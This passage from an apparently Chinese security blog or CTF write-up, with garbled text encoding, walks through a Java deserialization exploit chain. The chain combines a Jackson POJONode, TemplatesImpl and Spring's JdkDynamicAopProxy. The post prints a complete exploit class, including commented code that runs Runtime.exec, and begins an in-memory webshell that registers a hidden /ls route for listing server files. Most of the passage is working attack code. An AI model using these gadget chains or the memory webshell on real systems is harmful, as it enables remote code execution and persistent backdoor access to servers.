class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke dynamic proxy handler&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231105214715.png" alt="å¾®ä¿¡æˆªå›¾_20231105214715"></p>
<p>è¿™æ˜¯æ‰§è¡Œç»“æœ,å¯ä»¥çœ‹æ‡‚èƒ½è·å–åˆ°çš„æ–¹æ³•,å®Œå…¨å–å†³äºæ¥å£å®ç°äº†å“ªäº›æ–¹æ³•</p>
<p>è€Œ <code>javax.xml.transform.Templates</code> æ¥å£å…¶åªæœ‰ <code>newTransformer</code> å’Œ <code>getOutputProperties</code> è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•ï¼Œè®©ä»–ä½œä¸ºæˆ‘ä»¬ä»£ç†æ‰€éœ€çš„æ¥å£ï¼Œè¿™æ ·æœ€ç»ˆé€šè¿‡ <code>getDeclaredMethods</code> è·å–åˆ°çš„æ–¹æ³•å°±åªæœ‰ <code>newTransformer</code> å’Œ <code>getOutputProperties</code> äº†ï¼Œé‚£ä¹ˆæœ€ç»ˆè·å¾—çš„getteræ–¹æ³•ä¾¿åªæœ‰ <code>getOutputProperties</code> äº†ã€‚</p>
<p>å› æ­¤åªéœ€è¦æŒ‚ä»£ç†,å°±åªä¼šè·å–æ¥å£æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke dynamic proxy handler&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231106082615.png" alt="å¾®ä¿¡æˆªå›¾_20231106082615"></p>
<p>è¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯<code>Templates</code>é‡Œé¢å®šä¹‰çš„æ¥å£æ–¹æ³•</p>
<p><code>JdkDynamicAopProxy</code> æ˜¯ Spring æ¡†æ¶ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°äº† JDK åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œç”¨äºåˆ›å»ºä»£ç†å¯¹è±¡æ¥å®ç°é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„åŠŸèƒ½ã€‚</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231105215128.png" alt="å¾®ä¿¡æˆªå›¾_20231105215128"></p>
<p>è¿™é‡Œèƒ½å¤Ÿæ§åˆ¶advised</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231105215235.png" alt="å¾®ä¿¡æˆªå›¾_20231105215235"></p>
<p>è¿™é‡Œä¼šè§¦å‘åå°„æ–¹æ³•,è¿™é‡Œ<code>advised</code>å‰é¢è¯´è¿‡äº†å¯æ§</p>
<p>æˆ‘ä»¬å°†æ‰€éœ€çš„ <code>TemplatesImpl</code> çš„å¯¹è±¡ç”¨ <code>org.springframework.aop.framework.AdvisedSupport</code> å°è£…å³å¯</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>





<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231105215851.png" alt="å¾®ä¿¡æˆªå›¾_20231105215851"></p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231105220106.png" alt="å¾®ä¿¡æˆªå›¾_20231105220106"></p>
<h3 id="æ„é€ "><a href="#æ„é€ " class="headerlink" title="æ„é€ "></a>æ„é€ </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(templatesImpl);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br></pre></td></tr></table></figure>

<p>ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.get(evilref.class.getName());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">            writer.write(args);</span><br><span class="line">            writer.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´"><a href="#å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´" class="headerlink" title="å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´"></a>å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´</h2><p>æéº»éº»æ»´,å¤ªå¤æ‚äº†,è¿˜è¦å†™ä¸ªå†…å­˜é©¬æ‰¾åˆ°RASP,è¿˜å¥½ğŸ‘´æŠ€é«˜ä¸€ç­¹.</p>
<h3 id="åˆ—ç›®å½•"><a href="#åˆ—ç›®å½•" class="headerlink" title="åˆ—ç›®å½•"></a>åˆ—ç›®å½•</h3><p>nm,è·Ÿå–å¤§äº†ä¸€æ ·,æ•´è¿™bç©æ„,è‰¹ğŸ˜¡</p>
<p>é¦–å…ˆæ¥ä¸€ä¸ªé€’å½’åˆ—å‡ºæ‰€æœ‰ç›®å½•æ–‡ä»¶çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">&quot;ls&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;dir&quot;</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span 